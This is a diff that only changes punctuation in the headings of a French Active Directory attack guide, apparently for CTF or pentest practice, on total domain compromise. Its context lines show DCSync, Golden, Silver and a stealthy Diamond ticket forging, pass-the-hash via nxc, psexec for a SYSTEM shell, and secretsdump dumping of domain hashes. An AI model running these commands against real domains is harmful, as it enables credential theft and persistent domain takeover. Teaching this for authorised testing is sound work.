@@ -1,10 +1,10 @@
-# Phase 6 — Compromission Totale
+# Phase 6 : Compromission Totale
 
 Tu es Domain Admin, ou tu as le droit **DCSync**. C'est la fin de partie.
 
 ---
 
-## 6.1 — DCSync
+## 6.1 : DCSync
 
 ### Le concept
 
@@ -86,7 +86,7 @@ echo "DOMAIN_SID: $DOMAIN_SID"
 
 ---
 
-## 6.2 — Se connecter en tant qu'Administrator
+## 6.2 : Se connecter en tant qu'Administrator
 
 ```bash
 # Via psexec (shell SYSTEM)
@@ -104,7 +104,7 @@ nxc smb $DC_IP -u Administrator -H $ADMIN_HASH -d $DOMAIN
 
 ---
 
-## 6.3 — Golden Ticket
+## 6.3 : Golden Ticket
 
 ### Le concept
 
@@ -144,9 +144,9 @@ secretsdump.py -k -no-pass $DOMAIN/Administrator@$DC_FQDN -just-dc
 
 ---
 
-## 6.4 — Silver Ticket
+## 6.4 : Silver Ticket
 
-Forger un **TGS** pour un service spécifique — sans passer par le DC.
+Forger un **TGS** pour un service spécifique : sans passer par le DC.
 
 ```bash
 ticketer.py \
@@ -162,9 +162,9 @@ mssqlclient.py -k Administrator@sql01.entreprise.local
 
 ---
 
-## 6.5 — Diamond Ticket (variante furtive)
+## 6.5 : Diamond Ticket (variante furtive)
 
-Modifie le PAC d'un TGT légitime — moins détectable.
+Modifie le PAC d'un TGT légitime : moins détectable.
 
 ```bash
 ticketer.py \
@@ -178,7 +178,7 @@ ticketer.py \
 
 ---
 
-## 6.6 — Actions post-compromission
+## 6.6 : Actions post-compromission
 
 ```bash
 # Chercher les flags restants avec Administrator
@@ -191,7 +191,7 @@ lookupsid.py $DOMAIN/$USER:$PWD@$DC_IP 0 | head
 
 ---
 
-## 6.7 — Récapitulatif : la chaîne complète
+## 6.7 : Récapitulatif : la chaîne complète
 
 ```
 RECONNAISSANCE
